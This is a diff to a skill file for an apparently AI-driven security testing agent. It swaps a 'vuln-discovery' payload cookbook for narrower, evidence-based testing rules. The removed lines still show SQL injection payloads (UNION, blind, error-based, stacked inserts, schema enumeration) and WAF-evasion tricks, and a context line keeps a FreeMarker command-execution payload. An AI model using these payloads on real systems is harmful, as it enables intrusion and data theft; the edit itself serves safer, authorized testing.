@@ -3,12 +3,12 @@ name: vuln-discovery
 description: "Systematic identification and verification of security weaknesses in target applications"
 category: core
 tier: balanced
-toolRefs: [httpRequest, parseResponse, checkWaf, findEndpointsInResponse, evaluateRendered, compareResponses, measureTiming, followRedirects, updateGraph, writeFinding, recordEvidence, getCapturedHeaders, runPrimitive, sqlmap]
-primitives: [classicInjection, nosqlInjection]
+toolRefs: [httpRequest, parseResponse, checkWaf, findEndpointsInResponse, evaluateRendered, compareResponses, measureTiming, followRedirects, updateGraph, writeFinding, recordEvidence, getCapturedHeaders, runPrimitive, buildResearchMap, planResearchExperiments, listCapturedRequests, executePlannedExperiment, evaluateResearchExperiment]
+primitives: [nosqlInjection]
 triggers: ["find vulnerabilities", "security testing", "vulnerability scanning", "weakness identification", "security assessment", "bug hunting", "vuln detection", "security flaws", "test for vulnerabilities", "security issues"]
 contextBoosts: [sqli]
 mitreAttack: ["T1190", "T1195"]
-owaspRefs: ["OWASP Top 10 A03:2021 Injection", "OWASP Top 10 A06:2021 Vulnerable Components"]
+owaspRefs: ["OWASP Top 10:2025 A05 Injection", "OWASP Top 10 A06:2021 Vulnerable Components"]
 ---
 
 # Vulnerability Discovery
@@ -31,16 +31,9 @@ Vulnerability discovery is the systematic process of identifying weaknesses in a
 ## Auth Context
 Before making HTTP requests, call **getCapturedHeaders** with the target URL to get real auth context. Pass these in the `headers` parameter of httpRequest. Do not guess auth headers.
 
-## Core Principle: Dynamic Payloads
+## Core Principle: Evidence-Grounded Experiments
 
-You are the brain. Do NOT use hardcoded or canned payloads. For every injection point, reason about:
-- **Input type**: Is it a search box (string), numeric ID, email field, file upload, JSON key, XML element?
-- **Content type**: JSON, URL-encoded, multipart, XML, GraphQL?
-- **Context**: Inside a JavaScript string, HTML attribute, CSS, SQL WHERE clause, NoSQL query?
-- **WAF profile**: After checkWaf, adapt encoding (double URL-encode, unicode escape, case swap, comment injection)
-- **Second-order**: Will the input be stored and rendered elsewhere? If so, craft a payload that triggers on render
-
-Craft each payload from first principles based on the specific endpoint, parameter name, and observed behavior.
+Use domain skills and validated techniques as hypotheses, then adapt them to the observed request. A skill payload or primitive is a test idea, never evidence. For every candidate, identify the input type, content type, execution context, actor/state, expected secure behavior, and observable oracle. Do not mutate guessed routes or unrelated request fields.
 
 ## Methodology
 
@@ -67,92 +60,9 @@ For each injection point:
 
 ---
 
-### SQL Injection (Database-Specific)
+### SQL Injection
 
-**Generic Tautology:**
-
-```sql
-' OR '1'='1
-" OR "1"="1
-' OR 1=1--
-" OR ""="
-admin'--
-```
-
-**UNION-Based:**
-
-```sql
-UNION SELECT null,null,null
-UNION ALL SELECT null,null,null
-UNION SELECT 1,2,3--
-```
-
-**Blind Boolean:**
-
-```sql
-' AND 1=1--
-' AND 1=2--
-' AND (SELECT LENGTH(password) FROM users LIMIT 1)=10--
-```
-
-**Blind Time-Based:**
-
-```sql
-' AND SLEEP(5)--                              -- MySQL
-'; WAITFOR DELAY '0:0:5'--                    -- MSSQL
-'; SELECT PG_SLEEP(5)--                       -- PostgreSQL
-' AND DBMS_LOCK.SLEEP(5)--                    -- Oracle (requires privileges)
-'||(SELECT pg_sleep(5))||'                    -- PostgreSQL string-context
-```
-
-Use **measureTiming** to detect delay vs baseline.
-
-**Error-Based (extract data from error messages):**
-
-```sql
-' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
-' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--
-' AND 1=CONVERT(int,@@version)--              -- MSSQL type conversion
-' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--   -- Oracle
-' UNION SELECT NULL,NULL,NULL FROM information_schema.tables--
-```
-
-**Stacked Queries:**
-
-```sql
-'; SELECT * FROM users--
-'; INSERT INTO users VALUES('hacker','pass123')--
-```
-
-**Database-Specific Enumeration:**
-
-```sql
--- MySQL
-' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
--- PostgreSQL
-' UNION SELECT tablename,NULL FROM pg_tables WHERE schemaname='public'--
--- MSSQL
-' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--
--- Oracle
-' UNION SELECT table_name,NULL FROM all_tables WHERE ROWNUM=1--
--- SQLite
-' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--
-```
-
-**Second-Order SQLi:**
-- Register with username: `' OR '1'='1'--`
-- Login with that account to trigger the query
-- Inject into profile fields that are used in later queries
-
-```http
-POST /register HTTP/1.1
-
-username=admin'--&password=x&email=x@test.local
-
-POST /login HTTP/1.1
-
-username=admin'--&password=x
-```
+Load the dedicated **sql-injection** skill. It covers error, boolean, blind, time-based, UNION/projection, second-order, ORM, API resolver, and parser-boundary techniques with explicit prerequisites and proof limits. Start from a captured, non-empty request; use `planResearchExperiments` and the narrowest supported typed oracle. Do not use payload lists, schema enumeration, stacked statements, credential queries, file access, or OS-level escalation in routine discovery.
 
 ---
 
@@ -503,13 +413,10 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 ---
 
 ### WAF Bypass
-- Start with **checkWaf** to understand the WAF profile
-- Adapt encoding: double URL-encode, unicode, case swap, comment injection
-- Use **omitHeader** to remove protection headers
-- SQL comment insertion: `UN/**/ION SEL/**/ECT`
-- Mixed encoding: `%55nion %53elect`
-- Chunked transfer encoding bypass
-- HTTP parameter pollution: `id=1&id=2`
+- Use **checkWaf** to distinguish a filter response from application behavior.
+- Only test normalization differences when the route/input is observed and the authorization covers filter testing.
+- Change one encoding or parser layer at a time, keep the request otherwise identical, and use the same oracle as the baseline.
+- Do not disguise scanner traffic, evade monitoring, or count a WAF block as proof of an underlying injection.
 
 ### Step 4: Collect Evidence
 Every finding needs proof:
@@ -548,7 +455,7 @@ Every vulnerability you report MUST have a corresponding tool call response that
 If a tool call fails, say so honestly — do not invent a success.
 A template injection claim requires proof that `{{7*7}}` returned 49 in the response.
 An XXE claim requires proof that file content appeared in the response.
-A SQLi claim requires proof of error messages, data extraction, or timing differences.
+A SQLi claim requires a matching baseline and mutation, a SQL-specific error, a typed result differential, or a statistically supported timing oracle, followed by an independent retest. A single error page is only a candidate.
 A command injection claim requires proof of command output in the response or time delay.
 
 ## Trigger Conditions
